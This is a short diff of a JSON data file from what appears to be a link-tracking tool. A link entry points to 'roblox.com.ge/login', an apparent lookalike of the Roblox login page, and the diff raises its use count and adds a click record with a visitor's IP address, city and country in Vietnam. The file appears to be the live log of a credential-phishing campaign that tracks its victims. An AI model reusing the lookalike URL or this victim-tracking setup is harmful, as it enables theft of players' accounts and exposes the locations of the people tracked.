@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 847,
+    "useCount": 848,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6883,6 +6883,14 @@
       },
       {
         "timestamp": 1777179860430,
+        "ip": "14.182.143.73",
+        "country": "Vietnam",
+        "city": "Chí Linh",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777179899939,
         "ip": "14.182.143.73",
         "country": "Vietnam",
         "city": "Chí Linh",
